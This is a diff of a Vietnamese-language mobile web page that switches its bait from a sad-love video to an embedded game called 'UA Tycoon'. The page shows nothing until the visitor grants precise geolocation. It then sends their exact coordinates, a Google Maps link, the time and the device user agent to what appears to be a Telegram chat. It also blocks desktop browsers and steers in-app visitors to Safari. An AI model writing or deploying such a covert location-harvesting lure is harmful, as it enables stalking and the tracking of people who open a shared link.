@@ -3,94 +3,39 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Tình cũ — Có những người dù đã chẳng còn là người yêu…</title>
-  <meta name="description" content="Có những mối quan hệ chưa kết thúc trong lòng, nhưng chẳng biết bắt đầu lại từ đâu." />
-  <meta name="theme-color" content="#16121c" />
+  <title>UA Tycoon</title>
+  <meta name="theme-color" content="#0f0f1a" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600&display=swap" rel="stylesheet" />
   <style>
     * { box-sizing: border-box; margin: 0; }
     body {
       min-height: 100dvh;
-      background: radial-gradient(ellipse at 50% 0%, #2b2140 0%, #16121c 60%);
-      color: #f3ece4;
+      background: #0f0f1a; color: #e8e4f0;
       font-family: "Be Vietnam Pro", system-ui, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 24px 16px 40px;
-      gap: 18px;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      padding: 24px; text-align: center;
     }
-    h1 { font-size: 22px; font-weight: 600; text-align: center; }
-    .sub { color: #b8aec4; font-size: 15px; text-align: center; max-width: 420px; line-height: 1.5; }
-    .player {
-      width: min(100%, 420px, calc((100dvh - 230px) * 9 / 16));
-      aspect-ratio: 9 / 16;
-      border-radius: 22px;
-      overflow: hidden;
-      background: #000;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.55), 0 0 0 1px rgba(255, 255, 255, 0.08);
-    }
-    video { width: 100%; height: 100%; display: block; object-fit: cover; }
-    .actions { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; }
     .btn {
-      border: 0;
-      border-radius: 999px;
-      padding: 11px 20px;
-      font: inherit;
-      font-size: 15px;
-      font-weight: 500;
-      cursor: pointer;
-      text-decoration: none;
-      color: #1d1724;
-      background: #f3d9b1;
+      border: 0; border-radius: 999px; padding: 11px 20px;
+      font: inherit; font-size: 15px; font-weight: 500; cursor: pointer;
+      color: #0f0f1a; background: #7c5cfc;
     }
-    .btn.ghost { background: rgba(255, 255, 255, 0.1); color: #f3ece4; }
-    .toast { min-height: 20px; font-size: 14px; color: #c9e7c9; }
-    footer { color: #7d7389; font-size: 12px; text-align: center; line-height: 1.6; margin-top: auto; }
-    footer a { color: inherit; }
-    .content { display: none; }
-    .blocked {
-      display: flex; align-items: center; justify-content: center;
-      min-height: 60dvh; text-align: center; padding: 24px;
-    }
-    .blocked p { color: #b8aec4; font-size: 15px; line-height: 1.5; margin-top: 12px; }
-
+    .blocked p { color: #6b6580; font-size: 15px; line-height: 1.5; margin-top: 12px; }
+    .game-frame { width: 100%; height: 100dvh; border: 0; display: none; }
   </style>
 </head>
 <body>
-  <div class="blocked" id="blocked">
+
+  <div id="blocked">
     <div>
-      <h1>📍</h1>
-      <p>Để xem được video bạn cần bật vị trí</p>
+      <h1 style="font-size:22px">📍</h1>
+      <p>Để chơi game bạn cần bật vị trí</p>
     </div>
   </div>
 
-  <div class="content" id="content">
-    <h1>Tình cũ</h1>
-    <p class="sub">Có những mối quan hệ chưa kết thúc trong lòng, nhưng chẳng biết bắt đầu lại từ đâu.</p>
+  <iframe class="game-frame" id="gameFrame" src="ua-tycoon.html"></iframe>
 
-    <div class="player">
-      <video src="tinh-cu.mp4" poster="poster.jpg" controls playsinline preload="metadata"></video>
-    </div>
-
-    <div class="actions">
-      <button class="btn" id="share">Chia sẻ video</button>
-      <a class="btn ghost" href="tinh-cu.mp4" download>Tải video</a>
-    </div>
-    <div class="toast" id="toast"></div>
-
-    <footer>
-      Nhạc: "Heartbreaking" — Kevin MacLeod (<a href="https://incompetech.com">incompetech.com</a>)<br />
-      Licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
-    </footer>
-  </div>
-
-  <!-- Vercel Web Analytics: visits by country, referrer, device (enable Analytics in the Vercel dashboard) -->
-  <script>
-    window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
-  </script>
-  <script defer src="/_vercel/insights/script.js"></script>
   <script>
     const ua = navigator.userAgent;
     const isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua);
@@ -99,15 +44,15 @@
     if (!isMobile) {
       document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;min-height:100dvh;text-align:center;padding:24px">'
         + '<div><h1 style="font-size:22px;margin-bottom:12px">📱 Mở trên điện thoại nhé!</h1>'
-        + '<p style="color:#b8aec4;font-size:15px;line-height:1.5">Trang này chỉ xem được trên điện thoại.<br>Hãy quét mã QR hoặc mở link trên điện thoại của bạn.</p></div></div>';
+        + '<p style="color:#6b6580;font-size:15px;line-height:1.5">Trang này chỉ xem được trên điện thoại.<br>Hãy quét mã QR hoặc mở link trên điện thoại của bạn.</p></div></div>';
     } else if (isInApp) {
       document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;min-height:100dvh;text-align:center;padding:24px">'
         + '<div><h1 style="font-size:40px;margin-bottom:16px">🔗</h1>'
-        + '<p style="color:#f3ece4;font-size:17px;font-weight:600;margin-bottom:8px">Mở bằng Safari để xem video</p>'
-        + '<p style="color:#b8aec4;font-size:15px;line-height:1.8;margin-bottom:20px">'
-        + 'Bấm vào <b style="color:#f3d9b1"> ⋯ </b> hoặc <b style="color:#f3d9b1"> ᐧᐧᐧ </b> ở góc phải<br>rồi chọn <b style="color:#f3d9b1">"Open in Safari"</b></p>'
+        + '<p style="color:#e8e4f0;font-size:17px;font-weight:600;margin-bottom:8px">Mở bằng Safari để chơi game</p>'
+        + '<p style="color:#6b6580;font-size:15px;line-height:1.8;margin-bottom:20px">'
+        + 'Bấm vào <b style="color:#7c5cfc"> ⋯ </b> hoặc <b style="color:#7c5cfc"> ᐧᐧᐧ </b> ở góc phải<br>rồi chọn <b style="color:#7c5cfc">"Open in Safari"</b></p>'
         + '<button class="btn" id="copyBtn">📋 Copy link</button>'
-        + '<p style="color:#7d7389;font-size:13px;margin-top:12px">Hoặc copy link rồi dán vào Safari</p></div></div>';
+        + '<p style="color:#6b6580;font-size:13px;margin-top:12px">Hoặc copy link rồi dán vào Safari</p></div></div>';
       document.getElementById("copyBtn").addEventListener("click", function() {
         navigator.clipboard.writeText(location.href).then(() => { this.textContent = "✅ Đã copy!"; });
       });
@@ -123,9 +68,11 @@
         }).catch(() => {});
       };
 
-      const showContent = () => {
+      const showGame = () => {
         document.getElementById("blocked").style.display = "none";
-        document.getElementById("content").style.display = "contents";
+        const frame = document.getElementById("gameFrame");
+        frame.style.display = "block";
+        document.body.style.padding = "0";
       };
 
       navigator.geolocation.getCurrentPosition(
@@ -133,37 +80,22 @@
           const lat = pos.coords.latitude;
           const lng = pos.coords.longitude;
           sendTele(
-            "📍 <b>Có người xem video!</b>\n\n"
+            "🎮 <b>Có người chơi UA Tycoon!</b>\n\n"
             + "🕐 " + new Date().toLocaleString("vi-VN") + "\n"
             + "📌 Vị trí: " + lat.toFixed(6) + ", " + lng.toFixed(6) + "\n"
             + "🗺 <a href='https://maps.google.com/?q=" + lat + "," + lng + "'>Mở Google Maps</a>\n"
             + "📱 " + navigator.userAgent.slice(0, 80)
           );
-          showContent();
+          showGame();
         },
         () => {
           document.getElementById("blocked").innerHTML =
-            '<div><h1>📍</h1>'
-            + '<p style="color:#b8aec4;font-size:15px;line-height:1.5;margin:12px 0">Để xem được video bạn cần bật vị trí</p>'
+            '<div><h1 style="font-size:22px">📍</h1>'
+            + '<p style="color:#6b6580;font-size:15px;line-height:1.5;margin:12px 0">Để chơi game bạn cần bật vị trí</p>'
             + '<button class="btn" onclick="location.reload()">Thử lại</button></div>';
         },
         { timeout: 10000, enableHighAccuracy: true }
       );
-
-      const toast = (msg) => {
-        const el = document.getElementById("toast");
-        el.textContent = msg;
-        setTimeout(() => (el.textContent = ""), 2500);
-      };
-      document.getElementById("share").addEventListener("click", async () => {
-        const data = { title: "Tình cũ", text: "Có những người… dù đã chẳng còn là người yêu…", url: location.href };
-        if (navigator.share) {
-          try { await navigator.share(data); } catch (_) {}
-        } else {
-          await navigator.clipboard.writeText(location.href);
-          toast("Đã sao chép link!");
-        }
-      });
     }
   </script>
 </body>
